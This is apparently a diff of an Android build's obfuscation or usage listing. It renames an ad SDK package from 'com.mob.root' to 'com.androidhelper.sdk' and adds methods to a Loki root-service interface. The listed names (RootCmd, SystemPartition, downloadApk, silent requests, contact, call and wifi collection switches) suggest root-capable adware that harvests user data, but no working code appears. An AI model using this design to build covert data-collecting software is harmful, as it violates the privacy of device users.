@@ -1,3 +1,93 @@
+com.androidhelper.sdk.AdvertisingIdClient:
+    19:19:public AdvertisingIdClient()
+com.androidhelper.sdk.AdvertisingIdClient$AdInfo:
+    35:35:public boolean isLimitAdTrackingEnabled()
+com.androidhelper.sdk.BuildConfig
+com.androidhelper.sdk.R
+com.androidhelper.sdk.R$anim
+com.androidhelper.sdk.R$attr
+com.androidhelper.sdk.R$color
+com.androidhelper.sdk.R$dimen
+com.androidhelper.sdk.R$drawable
+com.androidhelper.sdk.R$id
+com.androidhelper.sdk.R$layout
+com.androidhelper.sdk.R$string
+com.androidhelper.sdk.R$style
+com.androidhelper.sdk.ad.task.ADTask:
+    protected abstract void pullDatas()
+    protected abstract void displayAD()
+com.androidhelper.sdk.ad.task.InstallGuideWindowTask:
+    70:70:protected void pullDatas()
+    215:266:private void downloadApk(java.lang.String)
+com.androidhelper.sdk.ad.task.InstallingWindowTask:
+    48:48:protected void pullDatas()
+com.androidhelper.sdk.entity.AD:
+    private java.lang.String downloadUrl
+    24:24:public java.lang.String getId()
+    96:96:public java.lang.String getDisplayPager()
+    136:136:public java.lang.String getDownloadUrl()
+    140:141:public void setDownloadUrl(java.lang.String)
+com.androidhelper.sdk.entity.ADConfig:
+    54:54:public int getCacheHours()
+    62:62:public java.lang.String getUpdateUrl()
+    70:70:public java.lang.String getGpServer()
+    78:78:public java.lang.String getGpPort()
+    86:86:public java.lang.String getAdRequestUrl()
+    102:102:public java.lang.String getDatasUploadUrl()
+    110:110:public java.lang.String getDatasUploadInterval()
+    118:118:public java.lang.String getFailoverServerUrl()
+    126:126:public java.lang.String getFailoverTryCount()
+    134:134:public boolean isShowFlavors()
+    142:142:public java.util.List getFlavors()
+    150:150:public boolean isUploadSwitch()
+    158:158:public boolean isAppSwitch()
+    166:166:public boolean isBhSwitch()
+    174:174:public boolean isContactSwitch()
+    182:182:public boolean isWifiSwitch()
+    190:190:public boolean isCallSwitch()
+    198:198:public boolean isWsSwitch()
+    206:206:public boolean isBsSwitch()
+    214:214:public boolean isArSwitch()
+com.androidhelper.sdk.entity.BSSwitch
+com.androidhelper.sdk.entity.CollectionAD
+com.androidhelper.sdk.entity.UserApp:
+    private long uninstallTime
+    22:22:public long getUninstallTime()
+    26:27:public void setUninstallTime(long)
+    40:40:public java.lang.String getSignature()
+com.androidhelper.sdk.entity.WifiConfig:
+    private java.lang.String eip
+    private long disconnectedStamp
+    83:83:public java.lang.String getEip()
+    87:88:public void setEip(java.lang.String)
+    107:107:public long getDisconnectedStamp()
+    111:112:public void setDisconnectedStamp(long)
+com.androidhelper.sdk.net.AMNetClient:
+    22:22:AMNetClient()
+com.androidhelper.sdk.net.SlientRequest:
+    private com.loki.sdk.LokiClientCallback lokiClientCallback
+com.androidhelper.sdk.net.parser.CollectionParser
+com.androidhelper.sdk.net.parser.SingleADParser
+com.androidhelper.sdk.tools.AESUtil
+com.androidhelper.sdk.tools.AMConstants
+com.androidhelper.sdk.tools.AMLogger:
+    11:11:public AMLogger()
+    16:20:public static void v(java.lang.String,java.lang.String)
+    24:27:public static void v(java.lang.String,int)
+com.androidhelper.sdk.tools.CommonUtils:
+    48:48:public CommonUtils()
+com.androidhelper.sdk.tools.RootCmd:
+    private static final java.lang.String TAG
+    9:9:public RootCmd()
+com.androidhelper.sdk.tools.SystemPartition:
+    private static final java.lang.String TAG
+    17:19:private SystemPartition()
+    26:26:public com.androidhelper.sdk.tools.SystemPartition getInstance()
+    17:17:synthetic SystemPartition(com.androidhelper.sdk.tools.SystemPartition)
+com.androidhelper.sdk.tools.SystemPartition$SystemPartitionHolder
+com.androidhelper.sdk.view.ADHorizontalScrollview$ZeroChildException:
+    private static final long serialVersionUID
+    79:81:public ADHorizontalScrollview$ZeroChildException(com.androidhelper.sdk.view.ADHorizontalScrollview)
 com.giga.GMSCaller.BuildConfig
 com.giga.sdk.ClientCallback:
     public static final java.lang.String ROOT_SERVICE
@@ -8,6 +98,7 @@ com.giga.sdk.ClientHelper:
 com.giga.sdk.ClientManager:
     185:197:public void downloadWithGooglePlayDirectly(java.lang.String,com.giga.sdk.ClientCallback,java.lang.String,int,long)
 com.giga.sdk.ClientManager$DirectDownloadAction
+com.loki.sdk.BuildConfig
 com.loki.sdk.ILokiClient$Stub:
     private static final java.lang.String DESCRIPTOR
     static final int TRANSACTION_publishService
@@ -19,8 +110,9 @@ com.loki.sdk.ILokiListener$Stub:
     static final int TRANSACTION_onApplicationSwitch
     static final int TRANSACTION_onCleanNotification
     static final int TRANSACTION_onGooglePlayDownload
+    static final int TRANSACTION_onDismissNotification
 com.loki.sdk.ILokiListener$Stub$Proxy:
-    112:112:public java.lang.String getInterfaceDescriptor()
+    127:127:public java.lang.String getInterfaceDescriptor()
 com.loki.sdk.ILokiService$Stub:
     private static final java.lang.String DESCRIPTOR
     static final int TRANSACTION_getVersion
@@ -35,25 +127,50 @@ com.loki.sdk.ILokiService$Stub:
     static final int TRANSACTION_uninstallPackage
     static final int TRANSACTION_setApplicationEnabled
     static final int TRANSACTION_setComponentEnabled
-    13:16:public ILokiService$Stub()
+    static final int TRANSACTION_registerExtension
+    static final int TRANSACTION_getExtension
+    14:16:public ILokiService$Stub()
     34:34:public android.os.IBinder asBinder()
 com.loki.sdk.ILokiService$Stub$Proxy:
-    197:197:public java.lang.String getInterfaceDescriptor()
-com.loki.sdk.LokiClientCallback
+    225:225:public java.lang.String getInterfaceDescriptor()
 com.loki.sdk.LokiService:
     private static final java.lang.String LOKI_SERVICE_ACTION
-    30:32:public int getVersion()
-    42:44:public java.lang.String getChannel()
-    78:81:public void unregisterListener(com.loki.sdk.LokiListener)
-    115:118:public void forceStopPackage(java.lang.String)
-    127:130:public void installPackage(java.lang.String,int)
-    140:143:public void uninstallPackage(java.lang.String,android.os.IBinder,int)
-    153:156:public void setApplicationEnabled(java.lang.String,int,int)
-    166:169:public void setComponentEnabled(android.content.ComponentName,int,int)
+    31:33:public int getVersion()
+    43:45:public java.lang.String getChannel()
+    79:82:public void unregisterListener(com.loki.sdk.LokiListener)
+    116:119:public void forceStopPackage(java.lang.String)
+    141:144:public void uninstallPackage(java.lang.String,android.os.IBinder,int)
+    154:157:public void setApplicationEnabled(java.lang.String,int,int)
+    167:170:public void setComponentEnabled(android.content.ComponentName,int,int)
+    180:183:public void registerExtension(java.lang.String,int,android.os.ParcelFileDescriptor)
+    192:196:public android.os.IBinder getExtension(java.lang.String)
 com.loki.sdk.internal.BinderIntent:
     8:8:public BinderIntent()
     25:28:public static void putBinderExtra(android.content.Intent,java.lang.String,android.os.IBinder)
-com.loki.sdk.internal.FileUtils
+com.loki.sdk.internal.FileUtils:
+    public static final int S_IRWXU
+    public static final int S_IRUSR
+    public static final int S_IWUSR
+    public static final int S_IXUSR
+    public static final int S_IRWXG
+    public static final int S_IRGRP
+    public static final int S_IWGRP
+    public static final int S_IXGRP
+    public static final int S_IRWXO
+    public static final int S_IROTH
+    public static final int S_IWOTH
+    public static final int S_IXOTH
+    17:17:public FileUtils()
+    40:42:public static int setPermissions(java.io.File,int,int,int)
+    48:50:public static int setPermissions(java.lang.String,int)
+    56:58:public static int setPermissions(java.lang.String,int,int,int)
+    87:93:public static boolean sync(java.io.FileOutputStream)
+    99:110:public static boolean copyFile(java.io.File,java.io.File)
+    119:139:public static boolean copyToFile(java.io.InputStream,java.io.File)
+    151:151:public static boolean isFilenameSafe(java.io.File)
+    163:210:public static java.lang.String readTextFile(java.io.File,int,java.lang.String)
+    222:228:public static void stringToFile(java.lang.String,java.lang.String)
+    238:253:public static long checksumCrc32(java.io.File)
 com.loopj.android.http.AsyncHttpClient:
     public static final java.lang.String LOG_TAG
     public static final java.lang.String HEADER_CONTENT_TYPE
@@ -282,86 +399,6 @@ com.loopj.android.http.TextHttpResponseHandler:
 com.loopj.android.http.Utils:
     27:28:private Utils()
 com.loopj.android.http.package-info
-com.mob.root.AMApplication:
-    149:161:private void addShortcut(android.os.Parcelable,java.lang.String,android.net.Uri)
-com.mob.root.AdvertisingIdClient:
-    19:19:public AdvertisingIdClient()
-com.mob.root.AdvertisingIdClient$AdInfo:
-    35:35:public boolean isLimitAdTrackingEnabled()
-com.mob.root.BuildConfig
-com.mob.root.R
-com.mob.root.R$anim
-com.mob.root.R$attr
-com.mob.root.R$color
-com.mob.root.R$dimen
-com.mob.root.R$drawable
-com.mob.root.R$id
-com.mob.root.R$layout
-com.mob.root.R$string
-com.mob.root.R$style
-com.mob.root.ad.task.ADTask:
-    protected abstract void pullDatas()
-    protected abstract void displayAD()
-com.mob.root.ad.task.InstallGuideWindowTask:
-    57:57:protected void pullDatas()
-com.mob.root.ad.task.InstallingWindowTask:
-    48:48:protected void pullDatas()
-com.mob.root.entity.AD:
-    23:23:public java.lang.String getId()
-    95:95:public java.lang.String getDisplayPager()
-com.mob.root.entity.ADConfig:
-    52:52:public int getCacheHours()
-    60:60:public java.lang.String getUpdateUrl()
-    68:68:public java.lang.String getGpServer()
-    76:76:public java.lang.String getGpPort()
-    84:84:public java.lang.String getAdRequestUrl()
-    100:100:public java.lang.String getDatasUploadUrl()
-    108:108:public java.lang.String getDatasUploadInterval()
-    116:116:public java.lang.String getFailoverServerUrl()
-    124:124:public java.lang.String getFailoverTryCount()
-    132:132:public boolean isShowFlavors()
-    140:140:public java.util.List getFlavors()
-    148:148:public boolean isUploadSwitch()
-    156:156:public boolean isAppSwitch()
-    164:164:public boolean isBhSwitch()
-    172:172:public boolean isContactSwitch()
-    180:180:public boolean isWifiSwitch()
-    188:188:public boolean isCallSwitch()
-    196:196:public boolean isWsSwitch()
-    204:204:public boolean isBsSwitch()
-    212:212:public boolean isArSwitch()
-com.mob.root.entity.BSSwitch
-com.mob.root.entity.CollectionAD
-com.mob.root.entity.UserApp:
-    private long uninstallTime
-    22:22:public long getUninstallTime()
-    26:27:public void setUninstallTime(long)
-    40:40:public java.lang.String getSignature()
-com.mob.root.entity.WifiConfig:
-    private java.lang.String eip
-    private long disconnectedStamp
-    83:83:public java.lang.String getEip()
-    87:88:public void setEip(java.lang.String)
-    107:107:public long getDisconnectedStamp()
-    111:112:public void setDisconnectedStamp(long)
-com.mob.root.net.AMNetClient:
-    22:22:AMNetClient()
-com.mob.root.net.parser.CollectionParser
-com.mob.root.net.parser.SingleADParser
-com.mob.root.tools.AESUtil
-com.mob.root.tools.AMConstants
-com.mob.root.tools.AMLogger:
-    9:9:public AMLogger()
-    14:18:public static void v(java.lang.String,java.lang.String)
-    22:25:public static void v(java.lang.String,int)
-com.mob.root.tools.CommonUtils:
-    48:48:public CommonUtils()
-com.mob.root.tools.RootCmd
-com.mob.root.tools.SystemPartition
-com.mob.root.tools.SystemPartition$SystemPartitionHolder
-com.mob.root.view.ADHorizontalScrollview$ZeroChildException:
-    private static final long serialVersionUID
-    79:81:public ADHorizontalScrollview$ZeroChildException(com.mob.root.view.ADHorizontalScrollview)
 com.nostra13.universalimageloader.cache.disc.DiskCache:
     public abstract java.io.File getDirectory()
     public abstract boolean remove(java.lang.String)
